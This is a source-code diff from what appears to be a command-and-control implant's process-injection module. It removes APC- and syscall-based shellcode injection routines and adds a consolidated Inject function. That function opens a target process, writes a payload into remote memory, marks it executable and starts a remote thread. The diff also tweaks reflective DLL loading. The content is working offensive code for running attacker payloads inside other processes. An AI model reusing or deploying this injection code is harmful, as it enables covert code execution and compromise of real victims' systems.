@@ -2,324 +2,160 @@
 #include <ntstatus.h>
 
 #include <Core/Win32.h>
-#include <Core/Syscalls.h>
 #include <Core/Package.h>
 #include <Core/MiniStd.h>
 #include <Inject/Inject.h>
 #include <Inject/InjectUtil.h>
 #include <Common/Macros.h>
+#include <Common/Defines.h>
 
-/*
- * TODO: rewrite this entire code
- * */
+/*!
+ * Inject code into a remote process
+ *
+ * @param Method    thread execution method.
+ * @param Handle    opened handle to the remote process.
+ * @param Pid       if no handle has been provided than open the process using the Pid
+ * @param x64       payload architecture (only x64/x86 supported).
+ * @param Payload   payload buffer to inject
+ * @param Size      payload buffer size to inject
+ * @param Offset    execution entrypoint offset (can be used to specify the ReflectiveLoader function)
+ * @param Argv      Argument buffer to pass to the injected code
+ * @param Argc      Argument buffer size to pass to the injected code
+ *
+ * @return returns a INJECTION_ERROR_? status
+ */
+DWORD Inject(
+    IN BYTE   Method,
+    IN HANDLE Handle,
+    IN DWORD  Pid,
+    IN BOOL   x64,
+    IN PVOID  Payload,
+    IN SIZE_T Size,
+    IN UINT64 Offset,
+    IN PVOID  Argv,
+    IN SIZE_T Argc
+) {
+    DWORD  Status  = INJECT_ERROR_FAILED;
+    DWORD  Tid     = 0;
+    HANDLE Process = NULL;
+    HANDLE Thread  = NULL;
+    PVOID  Memory  = NULL;
+    PVOID  Param   = NULL;
 
-BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
-{
-    NTSTATUS NtStatus = 0;
-    BOOL     Success  = FALSE;
-
-    if ( Inject )
-    {
-        PUTS( "Inject into a remote process" )
-
-        switch ( Method )
-        {
-            case INJECTION_TECHNIQUE_WIN32: PUTS( "INJECTION_TECHNIQUE_WIN32" )
-                {
-
-                }
-
-            case INJECTION_TECHNIQUE_APC: PUTS( "INJECTION_TECHNIQUE_APC" )
-                {
-                    HANDLE          hSnapshot   = { 0 };
-                    DWORD           threadId    = 0;
-                    THREADENTRY32   threadEntry = { sizeof( THREADENTRY32 ) };
-
-                    hSnapshot = Instance.Win32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );
-
-                    // TODO: change to Syscall
-                    BOOL bResult = Instance.Win32.Thread32First( hSnapshot, &threadEntry );
-                    while ( bResult )
-                    {
-                        bResult = Instance.Win32.Thread32Next( hSnapshot, &threadEntry );
-                        if ( bResult )
-                        {
-                            if ( threadEntry.th32OwnerProcessID == ctx->ProcessID )
-                            {
-                                threadId = threadEntry.th32ThreadID;
-
-                                CLIENT_ID           ProcClientID        = { 0 };
-                                OBJECT_ATTRIBUTES   ObjectAttributes    = { 0 };
-
-                                // init the attributes
-                                InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );
-
-                                // set the correct pid and tid
-                                ProcClientID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) ctx->ProcessID;
-                                ProcClientID.UniqueThread  = ( HANDLE ) ( ULONG_PTR ) threadId;
-
-                                Instance.Win32.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );
-
-                                break;
-                            }
-                        }
-                    }
-
-                    SysNtClose( hSnapshot );
-
-                    if ( NT_SUCCESS( ( NtStatus = Instance.Win32.NtSuspendThread( ctx->hThread, NULL ) ) ) )
-                    {
-                        PUTS("[+] NtSuspendThread: Successful")
-
-                        if ( ShellcodeInjectionSysApc( ctx->hProcess, lpShellcodeBytes, ShellcodeSize, ctx ) )
-                        {
-                            NtStatus = Instance.Win32.NtResumeThread( ctx->hThread, NULL );
-                            if ( NT_SUCCESS( NtStatus ) )
-                            {
-                                PUTS("[+] NtResumeThread: Successful")
-                                return TRUE;
-                            }
-                            else
-                            {
-                                PUTS("[-] NtResumeThread: failed")
-                                goto Win32Error;
-                            }
-                        }
-                    }
-                    else
-                    {
-                        PUTS("[-] NtSuspendThread: failed")
-                        goto Win32Error;
-                    }
-
-                Win32Error:
-                    PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-
-                    return FALSE;
-                }
-
-            case INJECTION_TECHNIQUE_SYSCALL:
-            {
-                PUTS("INJECTION_TECHNIQUE_SYSCALL")
-                return ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx );
-            }
-        }
-    }
-    else
-    {
-        PUTS( "Spawn and inject" )
-
-        switch ( Method )
-        {
-            case INJECTION_TECHNIQUE_APC:
-            {
-                PUTS( "INJECTION_TECHNIQUE_APC" )
-
-                PROCESS_INFORMATION ProcessInfo  = { 0 };
-                DWORD               ProcessFlags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | CREATE_NO_WINDOW;
-
-                if ( ProcessCreate( TRUE, NULL, Instance.Config.Process.Spawn64, ProcessFlags, &ProcessInfo, FALSE, NULL ) )
-                {
-                    ctx->hThread      = ProcessInfo.hThread;
-                    ctx->SuspendAwake = FALSE;
-                    if ( ShellcodeInjectionSysApc( ProcessInfo.hProcess, lpShellcodeBytes, ShellcodeSize, ctx ) )
-                    {
-                        NtStatus = Instance.Win32.NtAlertResumeThread( ProcessInfo.hThread, NULL );
-                        if ( ! NT_SUCCESS( NtStatus ) )
-                        {
-                            PUTS( "[-] NtResumeThread: Failed" );
-                            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-                        }
-                        else
-                            PUTS( "[+] NtResumeThread: Success" );
-
-                        Success = TRUE;
-                    }
-                    else
-                    {
-                        Success = FALSE;
-                    }
-
-                    SysNtClose( ProcessInfo.hThread );
-                    SysNtClose( ProcessInfo.hProcess );
-
-                    return Success;
-                }
-
-                break;
-            }
-
-            case INJECTION_TECHNIQUE_SYSCALL:
-            {
-                PUTS( "INJECTION_TECHNIQUE_SYSCALL" )
-
-                PROCESS_INFORMATION ProcessInfo  = { 0 };
-                DWORD               ProcessFlags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | CREATE_NO_WINDOW;
-
-                if ( ProcessCreate( TRUE, NULL, Instance.Config.Process.Spawn64, ProcessFlags, &ProcessInfo, FALSE, NULL ) )
-                {
-                    ctx->hProcess = ProcessInfo.hProcess;
-                    Success = ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx );
-
-                    SysNtClose( ProcessInfo.hThread );
-                    SysNtClose( ProcessInfo.hProcess );
-
-                    return Success;
-                }
-                break;
-            }
-
-            default:
-            {
-                PUTS( "DEFAULT" )
-                break;
-            }
-        }
+    /* check if required params have been specified */
+    if ( ( ( ! Handle ) && ( ! Pid ) ) || ( ( ! Payload ) && ( ! Size ) ) ) {
+        return INJECT_ERROR_INVALID_PARAM;
     }
 
-    return TRUE;
-}
+    /* set the process handle */
+    Process = Handle;
 
-BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
-{
-    NTSTATUS NtStatus        = 0;
-    LPVOID   lpVirtualMemory = NULL;
-    PVOID    ShellcodeArg    = NULL;
-    BOOL     Success         = FALSE;
-    SIZE_T   BytesWritten    = 0;
-
-    if ( ctx->Parameter )
-    {
-        ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ctx->ParameterSize, PAGE_READWRITE );
-        if ( ShellcodeArg )
-        {
-            NtStatus = Instance.Win32.NtWriteVirtualMemory( ctx->hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
-            if ( ! NT_SUCCESS( NtStatus ) )
-            {
-                PUTS( "[-] NtWriteVirtualMemory: Failed" )
-                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-            }
-        }
-    }
-
-    // NtStatus = Instance.Win32.NtAllocateVirtualMemory( hProcess, &lpVirtualMemory, 0, &ShellcodeSize, MEM_RESERVE | MEM_COMMIT,  );
-    lpVirtualMemory = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ShellcodeSize, PAGE_READWRITE );
-    if ( ! lpVirtualMemory )
-    {
-        PUTS("[-] NtAllocateVirtualMemory: failed")
-        goto End;
-    }
-    else
-        PUTS("[+] NtAllocateVirtualMemory: Successful");
-
-    NtStatus = SysNtWriteVirtualMemory( ctx->hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
-    if ( ! NT_SUCCESS( NtStatus ) )
-    {
-        PUTS("[-] NtWriteVirtualMemory: failed")
-        goto End;
-    }
-    else
-        PUTS("[+] NtWriteVirtualMemory: Successful")
-
-    // NtStatus = Instance.Win32.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
-    if ( ! MemoryProtect( DX_MEM_SYSCALL, ctx->hProcess, lpVirtualMemory, ShellcodeSize, PAGE_EXECUTE_READ ) )
-    {
-        PUTS("[-] NtProtectVirtualMemory: failed")
-        goto End;
-    }
-    else
-        PUTS("[+] NtProtectVirtualMemory: Successful")
-
-    ctx->Parameter = ShellcodeArg;
-    if ( ThreadCreate( DX_THREAD_SYSCALL, ctx->hProcess, lpVirtualMemory, ctx ) )
-    {
-        PUTS( "[+] ThreadCreate: success" )
-        Success = TRUE;
-    }
-    else
-    {
-        PUTS("[-] ThreadCreate: failed")
-        goto End;
-    }
-
-End:
-    if ( ! Success )
-        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-
-    PRINTF( "Success: %s\n", Success ? "TRUE" : "FALSE" )
-
-    return Success;
-}
-
-BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
-{
-    NTSTATUS    NtStatus        = 0;
-    DWORD       DosError        = 0;
-    LPVOID      lpVirtualMemory = NULL;
-    SIZE_T      BytesWritten    = 0;
-    PVOID       ShellcodeArg    = NULL;
-
-    if ( ctx->Parameter )
-    {
-        ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ctx->ParameterSize, PAGE_READWRITE );
-        if ( ShellcodeArg )
-        {
-            NtStatus = SysNtWriteVirtualMemory( hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
-            if ( ! NT_SUCCESS( NtStatus ) )
-            {
-                PUTS( "[-] NtWriteVirtualMemory: Failed" )
-                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-            }
-        }
-    }
-
-    lpVirtualMemory = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ShellcodeSize, PAGE_READWRITE );
-    if ( lpVirtualMemory )
-    {
-        PUTS("[+] MemoryAlloc: Successful")
-
-        NtStatus = SysNtWriteVirtualMemory( hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
-        if ( NT_SUCCESS( NtStatus ) )
-        {
-            PUTS("[+] Moved memory: Successful")
-
-            // NtStatus = Instance.Win32.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &BytesWritten );
-            if ( MemoryProtect( DX_MEM_SYSCALL, hProcess, lpVirtualMemory, ShellcodeSize, PAGE_EXECUTE_READ ) )
-            {
-                PUTS("[+] MemoryProtect: Successful")
-
-                // NtStatus = Instance.Win32.NtQueueApcThread( ctx->hThread, lpVirtualMemory, ShellcodeArg, NULL, NULL );
-                ctx->Parameter = ShellcodeArg;
-                if ( ThreadCreate( DX_THREAD_SYSAPC, hProcess, lpVirtualMemory, ctx ) )
-                {
-                    PUTS( "[+] ThreadCreate: Successful" )
-                    return TRUE;
-                }
-                else
-                {
-                    PUTS( "[-] ThreadCreate: failed" )
-                    goto Win32Error;
-                }
-
-            } else {
-                PUTS("[-] NtProtectVirtualMemory: failed")
-                goto Win32Error;
-            }
-
+    /* if no handle has been specified then get process handle by Pid */
+    if ( ! Process ) {
+        if ( ( Process = ProcessOpen( Pid, PROCESS_ALL_ACCESS ) ) == INVALID_HANDLE_VALUE ) {
+            PRINTF( "[INJECT] Failed to open process handle: %d\n", NtGetLastError() )
+            Process = NULL;
+            goto END;
         } else {
-            PUTS("[-] NtWriteVirtualMemory: failed")
-            goto Win32Error;
+            PRINTF( "[INJECT] Opened process handle to %d: %x\n", Pid, Process )
         }
-
     } else {
-        PUTS("[-] NtAllocateVirtualMemory: failed")
-        goto Win32Error;
+        PRINTF( "[INJECT] Using specified process handle: %x\n", Process )
     }
 
-Win32Error:
-    DosError = Instance.Win32.RtlNtStatusToDosError( NtStatus );
-    PackageTransmitError( CALLBACK_ERROR_WIN32, DosError );
-    return FALSE;
+    /* check if the process is x64 */
+    if ( x64 ) {
+        if ( ProcessIsWow( Process ) ) {
+            Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
+            goto END;
+        }
+        /* we good */
+    }
+
+    /* allocate memory in the remote process */
+    if ( ! ( Memory = MemoryAlloc( DX_MEM_DEFAULT, Process, Size, PAGE_READWRITE ) ) ) {
+        PUTS( "[INJECT] Failed allocating memory in remote process" )
+        goto END;
+    } else {
+        PRINTF( "[INJECT] Allocated memory in the remote process: %p\n", Memory )
+    }
+
+    /* write payload into remote process memory */
+    if ( ! ( MemoryWrite( Process, Memory, Payload, Size ) ) ) {
+        PUTS( "[INJECT] Failed to write payload into remote process" )
+        goto END;
+    } else {
+        PRINTF( "[INJECT] Wrote payload into remote process: %d written\n", Size )
+    }
+
+    /* change allocated memory from RW to RX */
+    if ( ! ( MemoryProtect( DX_MEM_SYSCALL, Process, Memory, Size, PAGE_EXECUTE_READ ) ) ) {
+        PUTS( "[INJECT] Failed to change memory protection" )
+        goto END;
+    } else {
+        PUTS( "[INJECT] Changed memory protection from RW to RX" )
+    }
+
+    /* check if any args has been specified */
+    if ( Argv && ( Argc > 0 ) )
+    {
+        /* allocate memory in the remote process */
+        if ( ! ( Param = MemoryAlloc( DX_MEM_DEFAULT, Process, Argc, PAGE_READWRITE ) ) ) {
+            PUTS( "[INJECT] Failed allocating argument memory in remote process" )
+            goto END;
+        } else {
+            PRINTF( "[INJECT] Allocated argument memory in the remote process: %p\n", Param )
+        }
+
+        /* write payload into remote process memory */
+        if ( ! ( MemoryWrite( Process, Param, Argv, Argc ) ) ) {
+            PUTS( "[INJECT] Failed to write argument into remote process" )
+            goto END;
+        } else {
+            PRINTF( "[INJECT] Wrote argument into remote process: %d written\n", Argc )
+        }
+    }
+
+    /* create new thread in remote process */
+    if ( ( Thread = ThreadCreate( Method, Process, C_PTR( Memory + Offset ), Param, &Tid ) ) ) {
+        Status = INJECT_ERROR_SUCCESS;
+        PRINTF( "[INJECT] Successful injected code into remote process: [Tid: %d]\n", Tid );
+    } else {
+        PRINTF( "[INJECT] Failed to create a new thread: %d\n", NtGetLastError() )
+    }
+
+END:
+    PUTS( "[INJECT] End of function. Cleanup start now" )
+
+    /* if we failed to inject the lets free up allocated memory */
+    if ( Status == INJECT_ERROR_FAILED )
+    {
+        /* free allocated payload */
+        if ( Memory ) {
+            MemoryFree( Process, Memory );
+            Memory = NULL;
+        }
+
+        /* free allocated param */
+        if ( Param ) {
+            MemoryFree( Process, Param );
+            Param = NULL;
+        }
+    }
+
+    /* only close process handle if it wasn't passed to the function */
+    if ( Process && ! Handle ) {
+        SysNtClose( Process );
+        Process = NULL;
+    }
+
+    /* close thread handle */
+    if ( Thread ) {
+        SysNtClose( Thread );
+        Thread = NULL;
+    }
+
+    return Status;
 }
 
 DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
@@ -363,17 +199,12 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         }
     }
 
-    ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer );
-    ReflectiveLdrOffset = 0;
-    if ( ReflectiveLdrOffset )
-    {
+    if ( ( ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer ) ) ) {
         PUTS( "The DLL has a Reflective Loader already defined" );
         HasRDll     = TRUE;
         FullDll     = DllBuffer;
         FullDllSize = DllLength;
-    }
-    else
-    {
+    } else {
         PUTS( "The DLL does not have a Reflective Loader defined, using KaynLdr" );
         HasRDll     = FALSE;
         FullDll     = Instance.Win32.LocalAlloc( LPTR, DllLdrSize + DllLength );
@@ -392,7 +223,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         if ( MemParamsBuffer )
         {
             PRINTF( "MemoryAlloc: Success allocated memory for parameters: ptr:[%p]\n", MemParamsBuffer )
-            NtStatus = Instance.Win32.NtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &BytesWritten );
+            NtStatus = SysNtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &BytesWritten );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "NtWriteVirtualMemory: Failed to write memory for parameters" )
@@ -434,7 +265,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
                 PRINTF( "ctx->Parameter: %p\n", ctx->Parameter )
 
                 // if ( ! ThreadCreate( ctx->Technique, hTargetProcess, ReflectiveLdr, ctx ) )
-                if ( ! ThreadCreate( DX_THREAD_DEFAULT, hTargetProcess, ReflectiveLdr, ctx ) )
+                if ( ! ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, hTargetProcess, ReflectiveLdr, MemParamsBuffer, NULL ) )
                 {
                     PRINTF( "[-] Failed to inject dll %d\n", NtGetLastError() )
                     PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
